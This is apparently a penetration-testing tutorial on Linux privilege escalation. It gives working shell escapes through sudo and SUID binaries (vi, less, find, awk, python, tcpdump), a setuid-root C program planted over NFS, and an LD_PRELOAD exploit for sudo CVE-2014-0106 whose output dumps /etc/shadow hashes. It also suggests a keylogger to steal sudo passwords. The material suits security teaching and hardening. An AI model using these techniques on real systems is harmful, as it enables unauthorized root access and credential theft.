---
description: Linux weak services and misconfiguration of permissions
---

# Privilege escalation

Once we have a limited shell it is useful to escalate that shells privileges. This way it will be easier to hide, read and write any files, and persist between reboots.

In this chapter I am going to go over these common Linux privilege escalation techniques:

* Kernel exploits
* Programs running as root
* Installed software
* Weak/reused/plaintext passwords
* Inside service
* Suid misconfiguration
* Abusing sudo-rights
* World writable scripts invoked by root
* Bad path configuration
* Cronjobs
* Unmounted filesystems

### Enumeration scripts <a id="enumeration-scripts"></a>

I have used principally three scripts that are used to enumerate a machine. They are some difference between the scripts, but they output a lot of the same. So test them all out and see which one you like best.

**LinEnum**

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

Here are the options:

```text
-k Enter keyword
-e Enter export location
-t Include thorough (lengthy) tests
-r Enter report name
-h Displays this help text
```

**Unix privesc**

[http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)  
Run the script and save the output in a file, and then grep for warning in it.

**Linprivchecker.py**+

{% embed url="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py" %}

### Privilege Escalation Techniques <a id="privilege-escalation-techniques"></a>

#### Kernel Exploits <a id="kernel-exploits"></a>

By exploiting vulnerabilities in the Linux Kernel we can sometimes escalate our privileges. What we usually need to know to test if a kernel exploit works is the OS, architecture and kernel version.

Check the following:

OS:

Architecture:

Kernel version:

```text
uname -a
cat /proc/version
cat /etc/issue
```

**Search for exploits**

```text
site:exploit-db.com kernel version

python linprivchecker.py extended
```

Don't use kernel exploits if you can avoid it. If you use it it might crash the machine or put it in an unstable state. So kernel exploits should be the last resort. Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the `sys.log`. So if you find anything good, put it up on your list and keep searching for other ways before exploiting it.

#### Programs running as root <a id="programs-running-as-root"></a>

The idea here is that if specific service is running as root and you can make that service execute commands you can execute commands as root. Look for webserver, database or anything else like that. A typical example of this is mysql, example is below.

**Check which processes are running**

```text
# Metasploit
ps

# Linux
ps aux
```

**Mysql**

If you find that mysql is running as root and you username and password to log in to the database you can issue the following commands:

```text
select sys_exec('whoami');
select sys_eval('whoami');
```

If neither of those work you can use a [User Defined Function/](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)

#### User Installed Software <a id="user-installed-software"></a>

Has the user installed some third party software that might be vulnerable? Check it out. If you find anything google it for exploits.

```text
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```



#### Weak/reused/plaintext passwords <a id="weakreusedplaintext-passwords"></a>

* Check file where webserver connect to database \(`config.php` or similar\)
* Check databases for admin passwords that might be reused
* Check weak passwords

```text
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

* Check plaintext password

```text
# Anything interesting the the mail?
/var/spool/mail
```

```text
./LinEnum.sh -t -k password
```



#### Service only available from inside <a id="service-only-available-from-inside"></a>

It might be that case that the user is running some service that is only available from that host. You can't connect to the service from the outside. It might be a development server, a database, or anything else. These services might be running as root, or they might have vulnerabilities in them. They might be even more vulnerable since the developer or user might be thinking "since it is only accessible for the specific user we don't need to spend that much of security".

Check the netstat and compare it with the nmap-scan you did from the outside. Do you find more services available from the inside?

```text
# Linux
netstat -anlp
netstat -ano
```



#### Suid and Guid Misconfiguration <a id="suid-and-guid-misconfiguration"></a>

When a binary with suid permission is run it is run as another user, and therefore with the other users privileges. It could be root, or just another user. If the suid-bit is set on a program that can spawn a shell or in another way be abuse we could use that to escalate our privileges.

For example, these are some programs that can be used to spawn a shell:

```text
nmap
vim
less
more
```

If these programs have suid-bit set we can use them to escalate privileges too. For more of these and how to use the see the next section about abusing sudo-rights:

```text
nano
cp
mv
find
```

**Find suid and guid files**

```text
#Find SUID
find / -perm -u=s -type f 2>/dev/null

#Find GUID
find / -perm -g=s -type f 2>/dev/null
```

Find suid bit enabled files

```text
find / -perm -4000 2>/dev/null
```

#### Abusing sudo-rights <a id="abusing-sudo-rights"></a>

If you have a limited shell that has access to some programs using `sudo` you might be able to escalate your privileges with. Any program that can write or overwrite can be used. For example, if you have sudo-rights to `cp` you can overwrite `/etc/shadow` or `/etc/sudoers` with your own malicious file.

`awk`

```text
awk 'BEGIN {system("/bin/bash")}'
```

`bash`

`cp`  
Copy and overwrite /etc/shadow

`find`

```text
sudo find / -exec bash -i \;

find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
```

`ht`

The text/binary-editor HT.

`less`

From less you can go into vi, and then into a shell.

```text
sudo less /etc/shadow
v
:shell
```

`more`

You need to run more on a file that is bigger than your screen.

```text
sudo more /home/pelle/myfile
!/bin/bash
```

`mv`

Overwrite `/etc/shadow` or `/etc/sudoers`

`man`

`nano`

`nc`

`nmap`

`python/perl/ruby/lua/etc`

```text
sudo perl
exec "/bin/bash";
ctr-d
```

```text
sudo python
import os
os.system("/bin/bash")
```

`sh`

`tcpdump`

```text
echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

`vi/vim`

Can be abused like this:

```text
sudo vi
:shell

:set shell=/bin/bash:shell    
:!bash
```

[How I got root with sudo/](https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/)

#### World writable scripts invoked as root <a id="world-writable-scripts-invoked-as-root"></a>

If you find a script that is owned by root but is writable by anyone you can add your own malicious code in that script that will escalate your privileges when the script is run as root. It might be part of a cronjob, or otherwise automatized, or it might be run by hand by a sysadmin. You can also check scripts that are called by these scripts.

```text
#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

#World writable files
find / -perm -2 ! -type l -ls 2>/dev/null
```

#### Bad path configuration <a id="bad-path-configuration"></a>

Putting `.` in the path  
If you put a dot in your path you won't have to write `./binary` to be able to execute it. You will be able to execute any script or binary that is in the current directory.

Why do people/sysadmins do this? Because they are lazy and won't want to write `./.`

This explains it  
[https://hackmag.com/security/reach-the-root/](https://hackmag.com/security/reach-the-root/)  
And here  
[http://www.dankalia.com/tutor/01005/0100501004.htm](http://www.dankalia.com/tutor/01005/0100501004.htm)

#### Cronjob <a id="cronjob"></a>

With privileges running script that are editable for other users.

Look for anything that is owned by privileged user but writable for you:

```text
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

#### Unmounted filesystems <a id="unmounted-filesystems"></a>

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```text
mount -l
cat /etc/fstab
```

#### NFS Share <a id="nfs-share"></a>

If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured.

```text
# First check if the target machine has any NFS shares
showmount -e 192.168.1.101

# If it does, then mount it to you filesystem
mount 192.168.1.101:/ /tmp/
```

If that succeeds then you can go to `/tmp/share`. There might be some interesting stuff there. But even if there isn't you might be able to exploit it.

If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell.

This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this:

```text
chmod 4777 exploit
```

```text
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

### Steal password through a keylogger <a id="steal-password-through-a-keylogger"></a>

If you have access to an account with sudo-rights but you don't have its password you can install a keylogger to get it.

### Other useful stuff related to privesc <a id="other-useful-stuff-related-to-privesc"></a>

**World writable directories**

```text
/tmp
/var/tmp
/dev/shm
/var/spool/vbox
/var/spool/samba
```

## Insecure File System Permissions

Consider the following Sudo configuration for our fictitious user account “appadmin”:

```text
$ sudo -l
[sudo] password for appadmin:
User appadmin may run the following commands on this host:
    (root) /opt/Support/start.sh, (root) /opt/Support/stop.sh, 
    (root) /opt/Support/restart.sh, (root) /usr/sbin/lsof
```

It all looks good so far. So let’s have a look at these scripts:

```text
$ ls -l /opt/Support/
total 4
-rwxr-xr-x 1 root     root     37 Oct  3 14:06 restart.sh
-rwxr-xr-x 1 appadmin appadmin 53 Oct  3 14:03 start.sh
$ ls -ld /opt/Support
drwxr-xr-x 2 appadmin appadmin 4096 Oct  3 13:58 /opt/Support
```

Don’t these file and directory permissions look interesting? We have several options to escalate our privileges here, we could either:

1. Create the non-existent file “stop.sh”
2. Modify the existing file “start.sh”
3. Move the file “restart.sh” and create another file with the same filename

Here is a demonstration of the third option:

```text
$ mv /opt/Support/restart.sh{,.bak}
$ ln -s /bin/bash /opt/Support/restart.sh
$ sudo /opt/Support/restart.sh
[sudo] password for appadmin:
# id
uid=0(root) gid=0(root) groups=0(root)
```

Game over! :\)

## Environment Variables

Consider the following Sudo configuration for our user account “monitor”:

```text
$ sudo -l
[sudo] password for monitor:
Matching Defaults entries for monitor on this host:
    !env_reset
User monitor may run the following commands on this host:
    (root) /etc/init.d/sshd
```

The env\_reset option is disabled! This means we can manipulate the environment of the command we are allowed to run. Depending on the Sudo version, we may be able to escalate our privileges by passing environment variables, as illustrated by the following well-known exploits:

* PS4 \([breno](http://packetstormsecurity.com/files/41442/sudo168p10.sh.txt.html)\)
* LD\_PRELOAD \([Kingcope](http://packetstormsecurity.com/files/71988/sudo-local.txt.html) or [Sensepost](http://www.sensepost.com/blog/9108.html)\)

Also keep in mind that there may be other dangerous environment variables that we could misuse \(think of PERL5OPT, PYTHONINSPECT etc.\).

It should be noted though, that even when env\_reset is disabled, most dangerous environment variables are now safely removed by Sudo, based on a default hard-coded blacklist. Run “sudo -V” as root to see this blacklist under “Environment variables to remove”.

However, in Sudo &lt; 1.8.5, we [found](http://seclists.org/oss-sec/2014/q1/510) that environment variables passed in on the command line are not removed even though they should be. Thus we can still escalate our privileges using for example the LD\_PRELOAD technique, as demonstrated below on a fully up-to-date Red Hat Enterprise Linux 5.10 system \(only missing the recent [security update](https://rhn.redhat.com/errata/RHSA-2014-0266.html) of course\):

```text
$ rpm -q sudo
sudo-1.7.2p1-28.el5
$ cat > xoxo.c <<'LUL'
#include <unistd.h>
#include <stdlib.h>

void _init()
{
 if (!geteuid()) {
   unsetenv("LD_PRELOAD");
   unlink("/tmp/libxoxo.so.1.0");
   setgid(0);
   setuid(0);
   execl("/bin/sh","sh","-c","cp /bin/bash /tmp/.bash; chown 0:0 /tmp/.bash; /bin/chmod +xs /tmp/.bash",NULL);
 }
}
LUL
$ gcc -o xoxo.o -c xoxo.c -fPIC
$ gcc -shared -Wl,-soname,libxoxo.so.1 -o /tmp/libxoxo.so.1.0 xoxo.o -nostartfiles
$ sudo LD_PRELOAD=/tmp/libxoxo.so.1.0 /etc/init.d/sshd blaaah
[sudo] password for monitor:
$ /tmp/.bash -p -c 'id;head -n 1 /etc/shadow'
uid=500(monitor) gid=500(monitor) euid=0(root) egid=0(root) groups=500(monitor)
root:$1$VjDVB93E$AUL2Mg1L2gH70HHxh2CEr/:16128:0:99999:7:::
```

The bug is located on line 685 of the file sudo-1.8.4p5/plugins/sudoers/env.c, where a boolean comparison is performed incorrectly. The following patch fixes this issue:

```text
--- sudo-1.8.4p5/plugins/sudoers/env.c  2012-03-30 04:37:01.000000000 +1100
+++ sudo-1.8.4p5-fixed/plugins/sudoers/env.c    2014-02-28 10:36:14.623915000 +1100
@@ -682,7 +682,7 @@
                okvar = matches_env_keep(*ep);
        } else {
            okvar = matches_env_delete(*ep) == false;
-           if (okvar == false)
+           if (okvar == true)
                okvar = matches_env_check(*ep) != false;
        }
        if (okvar == false) {
```

In Sudo 1.8.5, the affected code was actually changed and cleaned up which silently fixed the issue. As a result, in Sudo 1.8.5 and above, environment variables passed in on the command line are properly removed.

Note that RHEL 5.10 was vulnerable because it ships the [1.7.2p1](http://vault.centos.org/5.10/os/SRPMS/sudo-1.7.2p1-28.el5.src.rpm) version \(with every previous security patches applied\) and similarly, RHEL 6.0 through 6.3 inclusive ship a version from the 1.7 branch. However RHEL 6.4 was not vulnerable because it ships the [1.8.6p3](http://vault.centos.org/6.5/os/Source/SPackages/sudo-1.8.6p3-12.el6.src.rpm) version.

We responsibly disclosed this security issue to the vendor, and within a week, the vulnerability was assigned [CVE-2014-0106](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0106), the details were made [public](http://www.sudo.ws/sudo/alerts/env_add.html) and the [1.7.10p8](http://www.sudo.ws/sudo/maintenance.html#1.7.10p8) security fix was released. While security updates are being rolled out for the affected distributions, a simple workaround is to simply not disable env\_reset, which is the default behaviour.

## Escape to shell

Consider the following Sudo configuration for our user account “john”:

```text
$ sudo -l
[sudo] password for john:
User john may run the following commands on this host:
    (root) /usr/sbin/tcpdump
```

In this case, john is able to capture network traffic. A perfectly legitimate task for a system administrator, so what could possibly go wrong? The “-z postrotate-command” option \(introduced in tcpdump version 4.0.0\), is worth knowing:

```text
$ echo $'id\ncat /etc/shadow' > /tmp/.test
$ chmod +x /tmp/.test
$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
[sudo] password for john:
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
Maximum file limit reached: 1
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
root:$6$CnflBAm.SEqAN6Rz$rZhceJkWQlw1Dl1LaWltiT.cIhXyHtk5Ot2C7mMygrr7XBhJFzLkO8RKphzgowaYUMJHiO2MB9oBRCKFQAWoz0:16138:0:99999:7:::
bin:*:15980:0:99999:7:::
...
```

Note that “-Z root” is required on RedHat-based distributions \(Fedora, CentOS, etc.\) as they [patch](http://pkgs.fedoraproject.org/cgit/tcpdump.git/diff/tcpdump-4.2.1-eperm.patch?h=f17) the tcpdump package to drop root privileges before handling savefiles.

So what can you do to protect yourself against Sudo abuse? Make sure you scrutinise every program that a user is allowed to run with elevated privileges as there may be ways for users to break out to a nice \# prompt. For example, programs such as vi or less, that allow users to invoke arbitrary shell commands \(with ! or similar\), should be replaced with their more secure counterparts, rvim and cat respectively.

### References <a id="references"></a>

[http://www.rebootuser.com/?p=1758](http://www.rebootuser.com/?p=1758)

[http://netsec.ws/?p=309](http://netsec.ws/?p=309)

[https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/](https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/)

Watch this video!  
[http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams](http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams)

[http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections](http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections)

[https://www.rebootuser.com/?page\_id=1721](https://www.rebootuser.com/?page_id=1721)



